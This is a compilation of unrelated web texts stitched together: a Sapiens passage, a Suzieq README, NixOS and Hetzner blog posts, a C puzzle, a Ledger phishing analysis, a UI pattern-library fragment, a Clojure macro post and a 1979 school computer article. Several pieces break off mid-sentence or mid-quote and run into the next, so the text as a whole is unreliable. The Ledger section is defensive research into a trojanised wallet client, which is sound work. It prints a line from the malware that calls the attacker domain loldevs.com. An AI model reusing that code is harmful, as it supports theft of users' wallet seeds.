<p>Why didn’t humans abandon farming when the plan backfired? Partly because it took generations for the small changes to accumulate and transform society and, by then, nobody remembered that they had ever lived differently. And partly because population growth burned humanity’s boats. If the adoption of ploughing increased a village’s population from a hundred to 110, which ten people would have volunteered to starve so that the others could go back to the good old times? There was no going back. The trap snapped shut.</p>

<blockquote>
  <p>One of history’s few iron laws is that luxuries tend to become necessities and spawn new obligations</p>
</blockquote>

<p>This discrepancy between evolutionary success and individual suffering is perhaps the most important lesson we can draw from the Agricultural Revolution. When we study the narrative of plants such as wheat and maize, maybe the purely evolutionary perspective makes sense. Yet in the case of animals such as cattle, sheep and Sapiens, each with a complex world of sensations and emotions, we have to consider how evolutionary success translates into individual experience.</p>

<!-- In the following chapters we will see time and again how a dramatic increase in the collective power and ostensible success of our species went hand in hand with much individual suffering. -->

<!-- This was a far-reaching revolution, whose impact was psychological as much as architectural. Henceforth, attachment to ‘my house’ and separation from the neighbours became the psychological hallmark of a much more self-centered creature. -->

<p><strong>Suzieq</strong> is both a framework and an application using that framework, that is focused on 
<strong>improving the observability of your network</strong>.  We define observaility as the ability of a system to 
answer either trivial or complex questions that you pose as you go about operating your network. How easily 
you can answer your questions is a measure of how good the system's observability is. A good observable 
system goes well beyond monitoring and alerting. Suzieq is primarily meant for use by network engineers and designers.</p>
<p>Suzieq does multiple things. It collects data from different devices and systems. It normalizes the data and 
then stores it in a vendor independent way. Then it allows analysis of that data. </p>
<p>We believe Suzieq is novel because it is a disaggregated framework that allows you to independently pick:</p>
<ul>
<li>how you gather your data (agentless or agent-based)</li>
<li>how you store your data</li>
<li>how you interact with the data i.e. how you ask the questions and how you see the answers.</li>
</ul>
<p>With the applications that we build on top of the framework we want to demonstrate a different and more 
systematic approach to thinking about networks. We want to show how useful it is to think of your network holistically.</p>
<p>In this very early release of Suzieq, we've chosen some answers for the framework to get the ball rolling. </p>
<ul>
<li>We gather data using an agentless model using either SSH or REST API as the transport. </li>
<li>We normalize the data into a vendor-agnostic format.</li>
<li>We store all data in files using the popular big data format, Parquet. </li>
<li>All the analysis are exposed either via a CLI or via Python objects. The output can be rendered in various formats from plain text to JSON and CSV.</li>
<li>The analysis engine used in this release is pandas.</li>
</ul>
<p><strong>We support gathering data from Cumulus, Arista, JunOS and NXOS routers, and Linux servers.</strong> We gather:</p>
<ul>
<li>Basic device info</li>
<li>Interfaces</li>
<li>LLDP</li>
<li>MAC address table</li>
<li>MLAG (only for Cumulus and EOS at this time)</li>
<li>Routing table</li>
<li>ARP/ND table</li>
<li>OSPFv2</li>
<li>BGP (v4 unicast, v6 unicast and evpn AFI/SAFI)</li>
<li>EVPN VNI info (not for EOS at this time)</li>
</ul>
<p>We are just getting started with Suzieq. As befitting an early release, what you see is only a brief 
demonstration of what this approach can bring about. We've many, many ideas to implement in our upcoming 
releases, but we wanted to get this out so that people can start using it. And start understanding their 
networks to solve problems, validate or to make changes.</p>
<p>You can join the conversation via <a href="https://netenglabs.slack.com/">slack</a>. Send email to Dinesh or Justin with the email address to send the Slack invitation to. </p>
<p>We're also looking for collaborators to help us make Suzieq a truly useful multi-vendor, open source platform 
for observing all aspects of networking. Please read the <a href="https://suzieq.readthedocs.io/en/latest/CONTRIBUTING.md">collaboration document</a> for

<![CDATA[Eight Months of NixOS]]>

November 3, 2020 | https://catgirl.ai/log/nixos-experience/ | <a href="https://web.archive.org/web/*/https://catgirl.ai/log/nixos-experience/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articlebody">
    <p>About 8 months ago, I decided that I'd gotten tired of macOS. It's a
Unix, which is nice, and I like that I can set up things with
relatively minimal effort through Homebrew, but I wanted something
that actually gave me more control over my system. So I decided that
2020 was going to be the Year Of Linux On Ash's Laptop.</p>
<p>In addition, I decided to try out <a href="https://nixos.org/">NixOS</a>, which
is an operating system oriented around the Nix package manager. The
big thing that distinguishes Nix from other operating systems is that
it lets you manage your packages <em>declaratively</em>: you specify what
you want the state of your system to be, then run <code>sudo nixos-rebuild switch</code>, and it reconfigures your system to be in that state. I also
decided I would use
<a href="https://github.com/nix-community/home-manager">home-manager</a>, which
lets you do the same thing for your dotfiles. As is tradition, I also
decided to <a href="https://git.catgirl.ai/ext0l/nixos-config">version my
dotfiles</a>, though they're
still kind of a mess.</p>
<h2 id="the-good">the good</h2>
<h3 id="hardware-support">hardware support</h3>
<p>I bought a used Thinkpad T450s off of eBay, because I wanted to make
sure I had good hardware support, and the Thinkpad line has
historically had a reputation for things working out of the box. And
everything has worked fine: Bluetooth, wireless, even the touch screen
(not that I use it). I didn't have to hunt down any weird driver
repositories or modprobe anything into my kernel.</p>
<p>The one thing I haven't tested is the fingerprint reader, because I
don't trust it to be secure, so I never set it up in the first place.</p>
<p>I did run into one issue: when I bought a replacement battery off
eBay, Linux was having trouble recognizing it and reading its
status. I had to do some kind of magic dance to reset something or
another: I think it was 'pull the battery and AC adapter, hold the
power button for 5 seconds, then plug it back in'. But once I did
that, everything was fine.</p>
<h3 id="declarative-package-management">declarative package management</h3>
<p>This was the reason I specifically wanted to use NixOS in the first
place. I liked the idea of having my system's configuration explicitly
written out, and not just determined by whatever series of packages I
happen to have apt-get installed. And NixOS delivers; my <a href="https://git.catgirl.ai/ext0l/nixos-config">nixos-config
repo</a> contains not only my
dotfiles, but a list of all the programs I have installed, my fonts,
and so on. I also don't have to worry about having accidentally
installed something weird and then forgotten about it; whatever's not
in my /etc/nixos might as well not exist (though it can still leave
stuff in ~/.config and similar places).</p>
<p>I intend to eventually switch the server this blog is hosted on over
to NixOS for similar reasons, and I'm <em>definitely</em> looking forward to
being able to declaratively manage things like nginx configuration and
systemd scripts as opposed to scattering them all over my filesystem.</p>
<h3 id="customizability">customizability</h3>
<p>I've got everything set up the way I like it. I decided to finally
give tiling window managers a shot, and after using
<a href="https://awesomewm.org/">awesomewm</a>, I don't think I could go back to
having to arrange all of my windows by hand. Even on a laptop screen,
I like putting my messaging applications (Discord, Telegram, IRC)
side-by-side. And of course, having purpose-driven workspaces is
nice. Instead of hunting down my music player in a window switcher, I
just hit <code>Win-6</code>, since I always keep <code>cmus</code> on the 6th workspace.</p>
<p>I've also got bars set up to display things like my upcoming todo
count, my CPU usage, battery life, currently-playing music, and so
on. I could certainly have done this on MacOS using
<a href="https://tracesof.net/uebersicht/">Übersicht</a> or something similar,
but it feels intuitively 'cleaner' in some way to be doing this in an
operating system set up to have this kind of flexibility in the first
place.</p>
<h2 id="the-not-so-good">the not-so-good</h2>
<h3 id="the-nix-language">the nix language</h3>
<p>The Nix package manager uses its own language, which is also called
Nix, to define how packages work. The language is functional in the
style of something like Haskell or the ML family, but lacks a lot of
the niceties those languages have like a strong static type system or
a means for doing imperative stateful programming. I ran into this
when I was trying to generate a configuration file by iterating
through a list and having the callback update some amount of state;
Haskell has the state monad, but Nix has no such thing.</p>
<p>This is especially salient because Nix does <em>not</em> follow the standard
Linux filesystem hierarchy; it stores almost all of its libraries and
binaries under <code>/nix/store</code>. This means that you can have multiple
copies of something installed without them interfering with each
other, but it also means that you <em>need</em> to know how Nix packaging
works to compile anything. Even libc isn't in its usual place, so
downloading prebuilt binaries usually won't work.</p>
<p>Fortunately, packaging simple software generally just involves telling
it how to fetch it and what its build dependencies are, but figuring
out how exactly to do that and how to integrate it into the rest of
your configuration requires reading documentation. Which brings me to
the next point:</p>
<h3 id="extremely-sparse-documentation">extremely sparse documentation</h3>
<p>Even though the Nix language itself is fairly simple to understand,
the way in which Nix puts everything together can be... obtuse. For
example, each package in the nixpkgs monorepo is implemented as <a href="https://github.com/NixOS/nixpkgs/blob/master/pkgs/applications/misc/hello/default.nix">a
function</a>
(here, the <code>{stdenv, fetchurl}:</code> syntax at the top means that the file
declares a function that takes a record with two fields named <code>stdenv</code>
and <code>fetchurl</code>. However, when defining my own derivations to include
in my personal configuration for programs not packaged by Nix, instead
of defining a function, I just wrote out the derivation by hand. The
difference to me wasn't obvious, until I did some deep digging and
learned that behind the scenes, the nixpkgs repo invokes
<a href="https://nixos.org/guides/nix-pills/callpackage-design-pattern.html"><code>callPackage</code></a>,
which invokes the function with the relevant arguments.</p>
<p>Even just writing those packages involved searching the nixpkgs repo
for similar programs and then copy-pasting what they did. The
<a href="https://nixos.wiki/wiki/Packaging/Tutorial">official NixOS wiki</a> has
basically similar recommendations, and I found the NixOS manual to not
be super helpful here. I wound up making heavy use of the <a href="https://nixos.org/guides/nix-pills/">Nix
Pills</a>, which are a series of
posts that show you not only how Nix package management is
implemented, but <em>why</em> it works the way it does.</p>
<p>Similarly: some commands are invoked like <code>nix run</code>, some are
<code>nix-shell</code>. I don't know why. </p>
<h2 id="would-i-recommend-nix">would i recommend nix?</h2>
<p>Only to power users. If you're going to use it, you're going to have
to deal with the packaging stuff at some point, either to debug a
package or to use software that doesn't have one. And this means
you'll need to learn the Nix language, and wade through the nixpkgs
monorepo and some fairly iffy documentation. But if you can put up
with that, the 'everything is declarative' setup is <em>exactly</em> as nice
as I hoped it'd be, and I've had multiple instances where an update
broke something so I was able to just boot to an older
generation. Similarly, when the BleedingTooth vulnerability came out,
I was able to disable my Bluetooth stack with a one-liner in
<code>/etc/nixos/configuration.nix</code> to just blacklist the entire hardware
support and then when the kernel updates came out I was able to just
remove that single line as opposed to trying to remember where the
fuck I'd stored that definition.</p>

<ul>
<li><strong>Better documentation.</strong> Stuff that covers "I have a piece of
software that's not packaged, how do I package it locally". Or "the
software in nixpkgs is broken in some way, I'd like to test out some
changes to the package definition, how do I set up the overrides for
that". That sort of thing. A lot of this is covered on the wiki, so
the usual
<a href="https://en.wikipedia.org/wiki/Wikipedia:Be_bold">WP:SOFIXIT</a>
applies, but this is the sort of thing that I think should have
already been written.</li>
<li><strong>Faster switches for trivial changes.</strong> The big reason I don't
manage my .emacs.d via nix is that it means that even a trivial
change requires me to do the whole <code>sudo nixos-rebuild switch</code>
dance, which can take 20-30 seconds just to make a one-line
change. This kills my iteration velocity. There are workarounds like
having a 'staging' file that gets sourced and then every so often
moving code from the staging file into the main file, but that seems
like a workaround for a problem that shouldn't exist.</li>
<li><strong>Some kind of lockfile to store package versions.</strong> One of the bits
of state that <em>isn't</em> stored in <code>/etc/nixos</code> is what version of the
nixpkgs and home-manager repos I'm currently on. This means that if
I run a <code>switch --upgrade</code>, there's no way to go back without
rolling back those channels via <code>nix-env</code>. On the other hand, if
those versions were stored alongside my nix files, then I could just
revert them in case of a bad upgrade. My understanding is that
<a href="https://nixos.wiki/wiki/Flakes">flakes</a> are an upcoming feature
that solves this problem, among others.</li>
</ul>
<h2 id="final-thoughts">final thoughts</h2>
<p>Overall, I've definitely enjoyed the switch to Linux, and I can't see
myself going back to macOS any time soon. I may wind up buying a more
powerful laptop at some point, since this one is having problems with
driving a 2560x1440 monitor due to a low fill rate on the graphics
card, but I want to reduce my electronics waste footprint (hence why I
bought this one used), so I'm going to stick with it for at least a
few more years.</p>
<p>I'm also <em>probably</em> going to stick with NixOS, but I hope it becomes
better documented and more newbie-friendly. Right now, I'd hesitate to
recommend it to anyone who wants something that just works and isn't
interested in diving into the guts of their system or learning a new
language just to install software.</p>

<p>By <b>Susam Pal</b> on 03 Jun 2011</p>
<p>
Here is an interesting C puzzle I created recently. It is a silly one
but you might find it amusing.
</p>

<pre><code>#include &lt;stdio.h&gt;

int main()
{
    https://susam.in/
    printf("hello, world\n");
    return 0;
}</code>
</pre>

<p>
This code compiles and runs successfully.
</p>

<pre><samp>$ <kbd>c99 hello.c &amp;&amp; ./a.out</kbd>
hello, world</samp>
</pre>

<p>
However, the <a href="http://www.open-std.org/JTC1/SC22/WG14/www/docs/n1256.pdf">C99
standard</a> does not mention anywhere that a URL is a valid syntactic
element in C. How does this code work then?
</p>

<p>
<em><strong>Update on 04 Jun 2011:</strong> The puzzle has been solved
in the <a href="https://susam.in/blog/urls-in-c/comments/">comments</a> section. If you want to think
about the problem before you see the solutions, this is a good time to
pause and think about it. There are spoilers ahead.</em>
</p>

<p>
The code works fine because <code>https:</code> is a label and
<code>//</code> following it begins a comment. In case, you are
wondering if <code>//</code> is indeed a valid comment in C, yes, it is,
since C99. Download the <a href="http://www.open-std.org/JTC1/SC22/WG14/www/docs/n1256.pdf">C99
standard</a>, go to section 6.4.9 (Comments) and read the second
point which mentions this:
</p>

<blockquote>
Except within a character constant, a string literal, or a comment, the
characters <code>//</code> introduce a comment that includes all
multibyte characters up to, but not including, the next new-line
character. The contents of such a comment are examined only to identify
multibyte characters and to find the terminating new-line character.

A hardware wallet is defined as a particular type of wallet where sensitive information (such as private keys) are stored inside an external physical support (often similar to a USB device) in a secure way.</p><p>In order to exchange (receive and send) funds, the device is connected to a laptop and through a client users can easily and securely manage their funds. One of the major advantages of this solution is that no information actually leaves the hardware.

When sending, receiving and signing transactions, the user interfaces with the Ledger Live application that acts as an intermediary between the user and the wallet stored in the USB device. The hardware wallet is considered a good solution for users looking for the right balance of security and portability for a wallet.</p><p>Ledger’s Nano wallets, along with other brands and types of hardware wallets, are oftentimes used by participants in the cryptocurrency space who are in possession of large amounts of funds. This being the case, these users and their hardware are targets of nefarious actors whose goal is to access the seeds. Ledger invests large sums of money in the security of its products ― trying to devise increasingly complex ways to keep their customers' information secure. However, this is not always enough, as we will see in the following paragraphs.</p><h2 id="dissecting-the-phishing-e-mail">Dissecting the phishing e-mail</h2><p><img src="https://serhack.me/images/ledger/ledger_email_smell.png" alt="Email fake del Ledger"></p><p>During the course of the past week or so, many Ledger users received an ominous email with the subject: “Your Ledger assets may be at risk”.</p><p>The content of the email was:</p><p><img src="https://serhack.me/images/ledger/Ledger1.png" alt=""></p><p>In summary, the email warns of an alleged hacking attempt on Ledger servers that may have put a user’s funds at risk, so it invites users to set a new PIN.</p><p>Let’s analyze, in more detail, the content and style of this communication.</p><p>Focusing on the technical aspects, as you can see, the email was not sent from a Ledger company domain, but comes from “ledgersupport.io”, a domain created ad-hoc one day before sending the email. Normally, marketing emails are sent from “<a href="https://serhack.me/cdn-cgi/l/email-protection#a2cccdd0c7d2cedbe2cec7c6c5c7d08cc1cdcf"><span data-cfemail="3e50514c5b4e52477e525b5a595b4c105d5153">[email&nbsp;protected]</span></a>”. This is the first red flag that should instill some doubt on the validity and intent of the email.</p><p>The email headers are also very peculiar. The service used to send the phishing email is <a href="https://sendgrid.com/">Sendgrid</a>, when in reality Ledger uses <a href="https://shopify.com/">Shopify</a> ― a popular e-commerce platform that is integrated with <a href="https://iterable.com/">Iterable</a>. Further confirmation of this finding comes from the links “Unsubscribe” and “Open mail in browser”, which are all Sendgrid.net. This is our second red flag.</p><p>Another curiosity about emails is that some companies have their initial emails labelled as spam. This is largely due to the fact that each email has a score assigned with it, according to technical parameters such as false signatures, blacklisted words, etc. If the score is too low, it is marked as spam.</p><p>Often the technique used to create phishing emails is spoofing ― i.e. falsifying the sender, giving the impression that the email was sent from the original server, etc. The <a href="https://en.wikipedia.org/wiki/DomainKeys_Identified_Mail">DKIM header</a> is a particular header that allows you to verify the authenticity of the sent message and confirms that the message is coming from the correct domain. The DKIM header is essentially composed of one signature per message and domain. If the verification on the message fails, the email provider should already trash the email by marking it as spam.</p><p>Returning to the body of the email, a third red flag is discovered by analyzing the content of the text. While it may be true that Ledger found malware in its servers, you can rest assured that your funds are not in danger. Ledger stores the private key (the numerical representation of the seed) in a hardware element that is considered secure. As long as you do not share your seed or download something malicious, your funds are safe and no one can touch them.</p><p>On the other hand, however, there are a few stylistic and structural aspects that might initially lead a user to believe the validity of the email. From a stylistic perspective, the graphics of the email are identical in all respects to an official email sent by Ledger. From a structural perspective, the content of the email is well-written and crafted in formal English. The email, moreover, addresses the user by name. This is a very important element for the user, as it further leads the recipient of the email to believe that it was potentially sent by Ledger, since it holds sensitive personally identifiable information (PII).</p><p>Marked by a button with a background (<a href="https://www.color-hex.com/color/41ccb4">#41ccb4</a>) that recalls the style of the official website, a Call-To-Action (CTA) invites you to download the latest version of Ledger Live from an unofficial server in order to reset the pin.</p><p>The CTA <code>link.supportledger.io/ls/click?=id</code> is structured in a way where the id is unique for each email sent. This was most likely designed for tracking purposes. The link sends the user to the domain “hxxps://ledgėr[.]com” (note: <code>xn--ledgr-9za.com</code>) where they are invited to download the latest version of Ledger Live in order to recover the wallet.</p><h2 id="analysis-of-malicious-client">Analysis of malicious client</h2><p>Launched in July 2018, Ledger Live enables users to manage their cryptocurrency hardware and assets. Additionally, it features real-time price updates, asset exchange, multi-account management, and the convenience of an extremely simple setup process that is suitable for less experienced users.</p><p>Under the hood, we find that the Ledger Live application was developed with <a href="https://www.electronjs.org/">Electron</a>, a multi-platform framework based on <a href="https://www.google.com/chrome/">Chrome</a> and <a href="https://nodejs.org/en/">Node.js</a> that allows the development of Javascript-based applications. Desktop clients like Atom IDE, Github Desktop, Slack, and Teams have been programmed using this framework that requires only Javascript and Node.js API knowledge.</p><p>For all Electron-based applications, in addition to the Chrome libraries and the binary itself, the sub-folder <code>resources</code> is where we find the engine of the application ― i.e. the Javascript files that will run when the software starts.</p><p>Electron uses a special packaging to store the source files of the application, called <code>asar</code>. <a href="https://github.com/electron/asar">Asar</a> is a simple archive file that works in a similar way to the <a href="https://en.wikipedia.org/wiki/Tar_(computing)">TAR</a> archive, concatenating the files together. It is useful to note that neither asar nor TAR integrate basic compression, which makes Electron-built applications even heavier than they seem.</p><p>If you want to do the client desktop analysis, we need to start with unpacking the asar archive. To do this, we install the asar utility from node.JS:</p><p>Let’s start the extraction of the package:</p><p>This is where the fun begins. First of all we find two folders: <code>.webpack</code>, containing the code that will be executed by the application and <code>node-modules</code>, third-party libraries. Let’s focus on the folder <code>node-modules</code> to eliminate a hypothesis, which is a possible pollution of third-party code.</p><p>Often attackers modify third-party libraries by blurring malicious code, because some security analysts take for granted that the libraries are safe. A simple <code>diff</code> between the “malicious” version and a simple <code>npm install</code> denied that attackers had introduced malicious code into the libraries.</p><p>Now, our focus shifts to the <code>.webpack</code> folder. It mainly consists of built Javascript files and some resource files like images and style files. The main element of this folder is the file <code>main.js</code>, which contains more than 40,000 lines of code and is the engine of the application. This is very insightful!</p><p>There are two very interesting functions, <code>Init_InitC</code> and <code>work</code>. <code>Init_InitC</code> is one of the first functions and methods that are executed by the application and shows the start menu when the application starts.</p><p><img src="https://serhack.me/images/ledger/start_screen.jpg" alt=""></p><p>The initial menu consists of various items such as “Initialize a new Ledger Device”, “Reset”, “Use”. We immediately notice that the function connects to an unofficial domain <code>https://loldevs.com</code>. This domain was created the day before the phishing email campaign. As it turned out a posteriori, the file <code>check.php</code> checks the IP of the client if the information has already been acquired.</p><div><pre><code data-lang="Javascript">    <span>xmlHttp</span>.<span>open</span>(<span>"GET"</span>, <span>"https://loldevs.com/telemetry/check.php"</span>, <span>false</span>);

November 3, 2020 | https://figbert.com/posts/moving-to-hetzner-from-digitalocean/ | <a href="https://web.archive.org/web/*/https://figbert.com/posts/moving-to-hetzner-from-digitalocean/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Since I began working on self-hosting, I've been using a
<a href="https://m.do.co/c/1f23d011ae24">DigitalOcean</a> (affiliate link) VPS running <a href="https://www.debian.org/">Debian 10</a>.
However, after investigating the alternatives in the space,
I'll be moving to <a href="https://www.hetzner.com/">Hetzner Cloud</a> when my DigitalOcean
credits run out in six months. Here's why.</p>
<p>I went with DigitalOcean as my hosting platform primarily because
of the USD$50 credit included with <a href="https://education.github.com/pack">Github Student</a>.
I've used USD$20 of that credit as of today, and the remaining money
should run out around April 2020, giving me almost a year of VPS
for free. Not a bad deal.</p>
<p>With that said, as my credits hit the half-way point, I've begun
to think about what's to come. Namely, the fact that my current
server is running at a constant 80% memory usage – severely
limiting what I can self-host.</p>
<h2 id="money-talks">Money talks...</h2>
<p>I currently use the cheapest DigitalOcean VPS available. I have
1 vCPU, 1GB of RAM, 25GB of SSD, and 1TB of data transfer. All that
power is packed in a clean USD$5 per month. This is, as far as cloud
hosts go, pretty good bang for your buck. Hetzner <strong>blows that out of
the water</strong>. Take a look at this table:</p>
<table><thead><tr><th><strong>USD/Month</strong></th><th><strong>vCPU</strong></th><th><strong>Memory</strong></th><th><strong>Storage</strong></th><th><strong>Traffic</strong></th><th><strong>Provider</strong></th></tr></thead><tbody>
<tr><td>$3.41</td><td>1</td><td>2GB</td><td>20GB</td><td>20TB</td><td>Hetzner</td></tr>
<tr><td>$4.77</td><td>2</td><td>2GB</td><td>40GB</td><td>20TB</td><td>Hetzner</td></tr>
<tr><td>$5.00</td><td>1</td><td>1GB</td><td>25GB</td><td>1TB</td><td>DigitalOcean</td></tr>
<tr><td>$6.70</td><td>2</td><td>4GB</td><td>40GB</td><td>20TB</td><td>Hetzner</td></tr>
<tr><td>$10.00</td><td>1</td><td>2GB</td><td>25GB</td><td>2TB</td><td>DigitalOcean</td></tr>
</tbody></table>
<p>Check out the math on that, seriously. Hetzner's base tier offers
1 vCPU, 2GB of ram, 20GB of SSD, and 20TB of data transfer for
USD$3.41 per month. That's double the ram and 20 times the transfer
for almost <strong>half the price</strong> of my current DigitalOcean droplet.
The fourth down in the table above, the one I plan on purchasing, costs
USD$1.70 more than DigitalOcean and has <strong>quadruple the performace</strong>
of my current VPS. That's more than even <em>Docker</em> could need. Ok that
might be a slight exaggeration, but it's still a lot.</p>
<h2 id="and-it-speaks-for-the-trees">...and it speaks for the trees.</h2>
<p>Hetzner is a <a href="https://www.thegreenwebfoundation.org/directory/">green hosting provider</a>, as
certified by the <a href="https://www.thegreenwebfoundation.org/">Green Web Foundation</a>. DigitalOcean is not.
Obviously, climate change is important. If we look at it objectively,
it's one of the only extinction-level threats to human existence at
the moment. All that is to say that switching to a green hosting provider
is the only thing <a href="https://www.websitecarbon.com/website/figbert-com/">I need to do</a> according to <a href="https://www.websitecarbon.com/">this online
website carbon calculator</a>, and you know I can't resist
online website metrics.</p>
<h2 id="so-that-s-nice">So that's nice.</h2>
<p>Anyways, that's a pretty good summary of my thoughts on the move. I'm
probably going to use the move to make a few other changes to my hosting
setup (i.e. <code>docker-compose</code> to <a href="https://k3s.io/"><code>k3s</code></a>, <a href="https://umami.is/"><code>umami</code></a> to
<a href="https://plausible.io/"><code>plausible</code></a>). I'll keep you all abreast of the latest updates
to my hosting in future posts.</p>
<p>Until then, this is FIGBERT signing off. I should make a more consistent outro.</p>

Pattern libraries ensure consistency across various products. Thanks to a standardized pattern library, companies can create a visual brand through all their projects. Creating a consistent visual style for various apps is more challenging if done from scratch. So, using pattern libraries, teams will be able to create fully functional designs for multiple projects for a lower price.&nbsp;</li><li><strong>Improves understanding within the team</strong>. UX design for a mobile app is often created in different departments, isolated from one another. Patterns make sharing design solution easier and improve the overall communication quality. For instance, a developer can create a codebase for a new pattern and instantly share it with the entire group involved in the design process. All the materials will be permanently available and can be easily reused for the company’s future projects.</li><li><strong>Makes it easier to predict the impact of design decisions</strong>. Pattern libraries allow designers to ensure consistent performance all over the app as they can predict the impact of each used element. Using patterns, it’s easier to guess how a button, a form element, or typography will look on devices with different screen dimensions. This provides UI designers with better control over the interface and facilitates testing.&nbsp;</li><li><strong>Creates more room for collaboration</strong>. Pattern libraries provide team members with a shared vocabulary, a better understanding of the elements of the wireframe, and so on. As a result, when new members are introduced to the team, it’s easier for them to catch up and be fully engaged in development.&nbsp;</li></ul><h3>Cons of pattern libraries</h3><p>While pattern libraries seem a jack-of-all-trades in design, such an approach still comes with flaws and challenges. Here are a few cons designers usually notice when using UI/UX pattern libraries.&nbsp;</p><ul><li><strong>The standardized design gives a company lower odds of standing out</strong>.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>I've been actively using Clojure for more than 5 years now. It's no surprise I grew fond of its data transformation capabilities.</p><p>All these little functions, operating over a handful of data structures. All these beautiful transformation pipelines. You know, the ones with arrow after opening brace (<span>-&gt;</span> or <span>-&gt;&gt;</span>). The threading macros.</p><p>It's probably my favorite syntactic sugar. The device to turn lispy, nested kind of code to more humane, easier on the eyes.</p><p>So, instead of</p><pre><code><code>(reduce + (map :amount (filter cash? payments)))</code></code></pre><p>I can write</p><pre><code><code>(-&gt;&gt; payments</code><br>
<code>     (filter cash?)</code><br>
<code>     (map :amount)</code><br>
<code>     (reduce +))</code></code></pre><p>Sure, it's more lines, but it's easier to read because you don't need to follow right to left, innermost to outermost flow of data. Nothing stops me to write it as one liner too, I just prefer not to.</p><p>But then, transducers. They were introduced in Clojure 1.7 and seemed great. Less garbage, more performance, same old <span>map</span> and <span>filter</span>. But old habits die hard and I never really tried to use them. </p><p>Recently, something changed. </p><p>I've profiled some code and started to see unnecessary inefficiencies in every little transformation with all those intermediate sequences, born to die the next moment. </p><p>I've read <a href="https://clojure.org/about/history" target="_blank" rel="nofollow noopener">A History of Clojure</a> where Rich mentions he should've introduced transducers earlier. Like make them the primitive everything else is built on top of. </p><p>So, I tried. And they felt a little awkward. My favorite trick of using <span>-&gt;&gt;</span> was gone. </p><p>Take a simple pipeline you saw before:</p><pre><code><code>(-&gt;&gt; payments</code><br>
<code>     (filter cash?)</code><br>
<code>     (map :amount)</code><br>
<code>     (reduce +))</code></code></pre><p>You start with value and see how it flows through a number of steps. From top to bottom, producing result. It's natural to read, it's step by step, it's sequential.</p><p>Now look at the same thing but with transducers:</p><pre><code><code>(transduce</code><br>
<code>  (comp (filter cash?)</code><br>
<code>        (map :amount))</code><br>
<code>  + payments)</code></code></pre><p>Suddenly, it becomes nested again. Harder to read. The same pipeline is still there but shoved into blaring <span>comp</span>. Initial value no more in the start and reduction (<span>transduce</span>) and its reducing function are separated from each other.</p><p>Sure, I can make it slightly better by lifting the pipeline out of the form.</p><pre><code><code>(let [cash-amount (comp (filter cash?)</code><br>
<code>                        (map :amount))]</code><br>
<code>  (transduce cash-amount + payments))</code></code></pre><p>But now when reading top to bottom you encounter transformation first, without the knowledge of the value it is intended to transform. You need to read on to the reduction itself to learn the value and then go back and reread transformation to understand the result.</p><p>It's harder to read and awkward to write, but it seems like I'm expected to use transducers this way. Separating the transform and naming it. Even official documentation <a href="https://clojure.org/reference/transducers#_defining_transformations_with_transducers" target="_blank" rel="nofollow noopener">does this</a>.</p><p>But I don't want to name things unless I must. Especially for ad-hoc transforms that you can see in Clojure code all the time.</p><p>What if I could bring back some of the nice top to bottom feel to it? Have all the benefits and ergonomics of threading macro.</p><p>Something like this:</p><pre><code><code>(t-&gt; payments</code><br>
<code>     (filter cash?)</code><br>
<code>     (map :amount)</code><br>
<code>     (transduce +))	</code></code></pre><p>Since <span>-&gt;&gt;</span> is only a macro what stops me from making a macro of my own (besides the little indecision everyone feels)?</p><p>So, here it is:</p><pre><code><code>(defmacro t-&gt; [v &amp; forms]</code><br>
<code>  (let [[op &amp; args] (last forms)</code><br>
<code>        xf          (if (#{'transduce 'into} op)</code><br>
<code>                      (butlast forms)</code><br>
<code>                      forms)]</code><br>
<code>  (case op</code><br>
<code>    into      `(~op ~@args (comp ~@xf) ~v)</code><br>
<code>    transduce `(~op (comp ~@xf) ~@args ~v)</code><br>
<code>    `(sequence (comp ~@xf) ~v))))</code></code></pre><p>Now I can thread. But would I?</p></article></div>]]>

  <div itemprop="articleBody">
    <p><em>I’ve transcribed an article about the arrival of the “Computer Unit” - a PDP-11/34 - at my school in 1979. The unit became the early focus of a fascination with computing that’s never left me.</em></p>

<p>I went to school in the late 1970s and early 1980s - the dawn of computing for everyone. My very first experience of computing was at a terminal connected to a timesharing minicomputer, rather than at the keyboard of one of the personal computers of the day.</p>

<p>There was an article in the 1979 edition of my school’s magazine “The Hulmeian”, written by our head of Mathematics Morris Loveland. It brings back many happy memories, and provides some insight into computing in the early days.</p>

<p>Below the article, I’ve included some pictures accompanied by brief descriptions.</p>

<p><em>COMPUTER UNIT</em></p>

<p><em>In 1974 the School purchased a single computer terminal, a TEXAS 733, and established the G.P.O. dial-up link to Salford University. This project, initially between School and the University, made available on-line computer time to us and later to other educational establishments. It proved to be a most useful and successful facility and reports have been given in this magazine of some of the work undertaken in the five years in which the link was used. The School had between ten and fifteen hours of on-line time each week, mainly during lunch hours and after school. Some time was available during teaching time and a large number of boys had experience of using the BASIC language to a large remote processor.</em></p>

<p><em>Computing was mainly organised for small groups or for individual users, although a certain amount of class teaching was undertaken. The limitations of a single terminal caused delays and frustration. Boys were foreced to wait to use the system and it was found to be extremely difficult to teach a class of thirty boys where the visual display was a single sheet of typed material. Salford University extended the computer facility to several other schools resulting in a considerable reduction in the on-line time available to us.</em></p>

<p><em>Early in 1978 it was decided to investigate the possibility of installing a complete on-site computer system at School. The searches took nearly a year and in that time a system which would satisfy the requirements of the School was determined. The financial aspects were agreed in November 1978 and the system was delivered in January 1979.</em></p>

<p><em>The computer which has been installed is a SYSTIME 3000 comprising a PDP11/34 processor with 196Kb of working memory, two 4.8Mb disc drives for data storage, three visual display terminals (one of which is used for system control), a Superterm paper printer and the necessary hardware to include the original Texas terminal into the system. Thus four terminals instead of one are available for use with no restriction on the time when a boy may use the computer.</em></p>

<p><em>The language used is BASIC PLUS which is a variant of the BASIC language used during the past five years. Very few problems have been experienced with this minor change of language and it is a most suitable language for teaching purposes. BASIC PLUS is interactive, that is, one which enables a two way ‘conversation’ between user and machine. If an error is made by the user, either in typing or in the logic of what is communicated to the machine, he is informed of that error immediately and can make the required corrections.</em></p>

<p><em>The processor and system control is housed in the careers room and is linked by cables running across the quadrangle and over the roof of the Science block to room 34. This room has been redesigned and redecorated to be a terminal room, housing at present the four computer terminals.</em></p>

